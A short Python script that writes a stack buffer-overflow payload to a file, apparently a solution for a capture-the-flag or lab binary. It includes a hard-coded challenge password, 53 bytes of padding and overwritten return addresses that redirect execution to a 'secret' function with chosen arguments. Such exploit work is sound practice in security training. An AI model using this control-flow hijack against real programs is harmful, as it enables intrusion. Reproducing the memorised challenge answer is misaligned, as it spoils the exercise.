import struct

# Convert integer to byte array (integer little endian).
def dw(i):
    return struct.pack("<I",i)

offset = 53

secret_func2_addr = 0x401409

payload=''
payload+='NOP\n'
payload+='IDA_1z_y0ur_fr1end\n'

payload += 'A' * offset


payload += dw(0x00000194)
payload +='A'*12

payload += dw(secret_func2_addr)

payload += dw(0x00401250)

payload += dw(0x00000065)
payload += dw(0x0000006c)
payload += dw(0x0000006b)
payload += dw(0x00000069)


with open('payload_b', 'wb') as f:
    f.write(payload)
